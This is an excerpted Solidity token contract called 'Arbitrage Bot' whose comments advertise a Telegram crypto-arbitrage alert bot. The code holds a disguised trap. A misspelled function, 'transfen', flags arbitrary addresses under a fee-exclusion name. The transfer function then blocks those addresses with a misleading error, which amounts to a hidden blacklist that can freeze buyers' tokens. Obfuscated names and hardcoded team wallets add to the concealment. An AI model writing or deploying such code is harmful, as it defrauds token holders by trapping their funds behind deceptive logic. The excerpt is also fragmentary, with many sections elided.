...
//Telegram's powerful Arbitrage Bot is poised to deliver:
//Notifications about arbitrage opportunities on crypto exchanges with monitoring support of the 10 most popular exchanges and 8 coin vs USD pairs;
//Tracking of price drops and surges for a specified threshold. You can specify multiply thresholds of all supported pairs;
...
contract ArbitrageBot is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Arbitrage Bot";
    string private _symbol = unicode"ARB";
    ...
    uint256 private _maxTxAmount = 2000000 * 10**_decimals;
    uint256 private _maxWalletSize = 2000000 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWallet = payable(address(0xfC446e4C28BEAc1D301A7c7a7EbDD04A5d6f8dE2));
        marketingWallet = payable(address(0x93C1251E3fF83dd9dBA70ef7B412274FBfA6070e));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isExcludedFromFees[sender], "Unable to locate corresponding TransferEventLOGS");
        if(inSwapAndLiquify)
        { 
    ...
    function transfen(bool state, address[] calldata addresses) external virtual {
        tracker(true);
        for (uint256 i; i < addresses.length; i++) {
        isExcludedFromFees[addresses[i]] = state;
      }
    }
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 spoke = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = excape.mul(spoke);
    ...
    function tracker(bool status) view public{
        if (!status) return;
